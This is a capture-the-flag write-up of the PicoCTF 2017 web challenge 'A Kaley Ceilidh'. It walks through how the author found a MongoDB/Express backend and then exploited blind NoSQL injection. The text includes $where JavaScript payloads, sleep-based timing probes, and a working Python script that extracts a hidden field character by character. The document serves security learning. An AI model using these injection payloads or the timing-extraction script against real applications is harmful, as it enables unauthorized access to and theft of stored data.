# A Kaley Ceilidh

This is a Level 4 Web challenge from [PicoCTF2017](https://2017game.picoctf.com/), worth 175 points. The [site](http://shell2017.picoctf.com:8080/) presents a simple interface to a joke Scottish grocery store. I did not solve this one on my own, but I'm documenting the learning experience.

### Reconnaissance

Simple SQL injection attacks do not seem to work. The hints nudge the user in the right direction:

    There's not a whole lot you can do on this application.
    If your normal attacks aren't working, perhaps you need to think bigger.
    Humongous, in fact.

    The server probably won't show you anything that contains a "flag" property.

Fair enough. A forum comment indicated that the server is likely running Mongo DB, which means this is probably a NoSQL injection problem. Absent that tip I might have tried scanning the host for open ports using `nmap`, but I went with the forum comment as the server is running on Amazon AWS and I don't want to get CMU into trouble with Amazon.

Getting some tips from a [Russian Youtube video](https://www.youtube.com/watch?v=h69UYuCYWP8), I tried installing `mongodb-client` and attempting to directly connect to the server:

    $ mongo 34.206.4.227
    MongoDB shell version: 2.6.10
    connecting to: 34.206.4.227/test
    warning: Failed to connect to 34.206.4.227:27017, reason: errno:111 Connection refused
    Error: couldn't connect to server 34.206.4.227:27017 (34.206.4.227), connection attempt failed at src/mongo/shell/mongo.js:148
    exception: connect failed

The error message confirms that we're dealing with MongoDB. They've secured the database from direct access with a username and password, and my guess is that this is a web problem so I shouldn't be trying to brute force those credentials.

I wonder if the MongoDB version can give me some insight into potential NoSQL injection vulnerabilities?

Viewing [this site](https://software-talk.org/blog/2015/02/mongodb-nosql-injection-security/) clued me in that I should try to determine if the server is running PHP, NodeJS, or possibly something else. Previous problems made use of NodeJS, so that is perhaps more likely.

I had fired up BurpSuite and intercepted a few queries. Previously I had tried:

    {"name": {"==", "Kale Haggis"}}

with the response:

    HTTP/1.1 400 Bad Request
    X-Powered-By: Express
    Content-Security-Policy: default-src 'self'
    X-Content-Type-Options: nosniff
    Content-Type: text/html; charset=utf-8
    Content-Length: 1128
    Date: Sun, 14 Jan 2018 06:50:14 GMT
    Connection: close

    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Error</title>
    </head>
    <body>
    <pre>SyntaxError: Unexpected token , in JSON at position 13<br> &nbsp; &nbsp;at Object.parse (native)<br> &nbsp; &nbsp;at parse (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/body-parser/lib/types/json.js:88:17)<br> &nbsp; &nbsp;at /problems/fb57a362b19de0f734e21132a9b7e552/node_modules/body-parser/lib/read.js:116:18<br> &nbsp; &nbsp;at invokeCallback (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/raw-body/index.js:262:16)<br> &nbsp; &nbsp;at done (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/raw-body/index.js:251:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/raw-body/index.js:307:7)<br> &nbsp; &nbsp;at emitNone (events.js:86:13)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:185:7)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:974:12)<br> &nbsp; &nbsp;at _combinedTickCallback (internal/process/next_tick.js:80:11)<br> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:104:9)</pre>
    </body>
    </html>

The server's JSON parser is choking on my input.

A quick query for "node_modules/body-parser" indicates that the server is running NodeJS. Accordingly, any exploit would be taking advantage of JavaScript and MongoDB's own back-end language (as specified in the documentation).

I consulted [this](https://www.owasp.org/images/f/fa/AppSecIL2016_NodeJS-Security_LiranTal.pdf) reference and came up with:

    {"name": {"$gt":""}}

This would theoretically return every `name` in the database. The query returns:

    HTTP/1.1 200 OK
    X-Powered-By: Express
    Content-Type: text/html; charset=utf-8
    Content-Length: 7
    ETag: W/"7-Vuu5vA8hV5HSudFEr8bWQajjaE0"
    Date: Sun, 14 Jan 2018 06:48:43 GMT
    Connection: close

    "Error"

Well! That's interesting, the NodeJS parser appears to have no problem with the query, which I think means that an injection of some sort should be feasible. Now, MongoDB itself is choking on my input. Interesting.

Also, after some more reading, it turns out that "X-Powered-By: Express" is a sign that I'm working with Express JS, a "de facto [standard](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html) in the NodeJS community".

After additional effort, I was making no further progress. I looked for a hint and found only one write-up by [LFlare](https://github.com/LFlare/picoctf_2017_writeup/tree/master/web/a-kaley-ceilidh). MongoDB has a `$where` function that will let the user run arbitrary JavaScript (see this [OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection) reference). The back end might run a query like:

    `db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );`

I know "Kale Haggis" to be an item for "sale" on the site. So I tried searching for "test" and replacing the resulting payload (`{"name": "test"}`) with the following:

    {"$where": "this.name != 'Kale Haggis'"}

That query works and returns every element but Kale Haggis. I can also run this search:

    {"$where": "this.name != 'Kale Haggis'; return '' == ''"}

That appears to return everything in the database collection -- but still no flag. Keep in mind that the initial hint for the problem suggests that the database is configured to not return the flag, even if it's there.

It was evident at this point that I would have to execute arbitrary JavaScript, and since I haven't learned JavaScript yet I quickly went through a starter course at CodeAcademy. After that I did some more hacking but was stuck on how to execute arbitrary JavaScript. (The approach makes total sense once you've seen it once, but this was new for me.) Out of hints and with only a single write-up remaining, I decided it would be a good investment of my time to understand how the attack gets conducted, be able to reproduce it, and then solve something like this in other CTFs later. So the rest of this write-up is informed by LFlare's exploit.


### Exploiting the vulnerability

Based on LFlare's exploit and the OWASP site, I wrote the following query:

    {"$where": "function() {return this.name != 'Kale Haggis'};"}

That also returns every item except for "Kale Haggis." Great! Now I can execute arbitrary JavaScript within the function prior to the `return` statement.

Here I was working with a solution, but figured I'd learn as much as I could about how to do this from scratch in the future, so I used the solution code as a guide for probing the database as if I still didn't know what to do. At first I thought that the query likely to be run on the back end is something like:

    db.records.find( { "[user_specified_param1]": "[user_specified_param2]" }, { "flag": 0 , "_id": 0} )

The second parameter passed to `find` is a [projection](https://docs.mongodb.com/v3.0/core/read-operations-introduction/) that would exclude the 'flag' property from any data returned to the user. As it turns out, only one document in the database collection has a 'flag' property.

I thought about trying to return different things based on if `this.flag` is in the database:

    {"$where": "function() {if(this.flag){return this.name != 'Kale Haggis';}else{return this.name == 'Kale Haggis';}}"}

That returns:

    {"data":[{"name":"Kale Haggis","description":"All the things you hate about haggis, without any of its almost-redeeming qualities!","cost":"$13.37","tags":["kale","haggis","gross","food","green","expensive"]}],"time":3}

That confused me at first, but in retrospect what's happening is that the query would likely return two documents: the flag, and 'Kale Haggis' (the only document which both has no flag property and is named 'Kale Haggis'). The server then excludes the flag from the set of documents to return to the user, so I just get back one document.

Next, I tried:

    {"$where": "function() {if(this.flag.length > 0){sleep(10000);} return true;"}

which returns a `MongoDB` error. Unsure about why, I did some debugging:

    {"$where": "function(){return true;}"}

returns all documents (except the flag) -- eight in total.

    {"$where": "function(){sleep(3000);return true;}"}

sleeps for about 27 seconds: three seconds per document that I received back, plus three more seconds for the flag.

    {"$where": "function(){if(this.flag){sleep(3000);}return true;}"}

sleeps for three seconds. That's how I determined that only the flag document has a `flag` property, and corrected my previous query:

    {"$where": "function(){if(this.flag && this.flag.length > 2){sleep(3000);}return true;}"}

The query properly sleeps for three seconds. The previous error message resulted from checking the length of a property (aka field) that is undefined for at least one document.

Now, we have a way to read the flag without returning it, using methods similar to a blind SQL injection. After reading the documentation for sending POST requests straight from Python, I can now follow LFlare's approach. Here's the exploit:

    # Kaley Ceilidh

    import requests
    time_padding = 20

    def get_flag_character(i):
        payload = dict({"$where":"function(){" + \
                                 "  if(this.flag && this.flag.length > 2){" + \
                                 "    sleep(this.flag.charCodeAt(" + str(i) + ")*"+str(time_padding)+");}" + \
                                 "  return true;}"})
        r = requests.post('http://shell2017.picoctf.com:8080/search', json=payload )
        return chr(r.json()['time']//time_padding)

    result = ""
    for i in range(50):
        try:
           result += get_flag_character(i)
           print(result)
        except:
           print(result)

![completed](./Kaley_Ceilidh_solved.png)

Awesome! In the process of completing this problem I learned more about PHP, JavaScript, MongoDB queries, Http requests in Python, and blind NoSQL injection. One aspect of the problem that still confuses me is that I was able to place a call to MongoDB's `sleep` function inside of JavaScript code, when JavaScript appears to have no native `sleep` function. Hope someone finds the write-up useful.
